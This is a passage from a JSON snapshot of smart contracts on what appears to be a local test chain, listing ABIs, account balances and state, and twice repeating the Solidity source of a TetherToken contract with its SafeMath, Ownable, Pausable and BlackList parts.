"constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x59d3631c86BbE35EF041872d502F218A39FBa150",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x59d3631c86BbE35EF041872d502F218A39FBa150": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x0290FB167208Af455bB137780163b7B7a9a10C16",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": 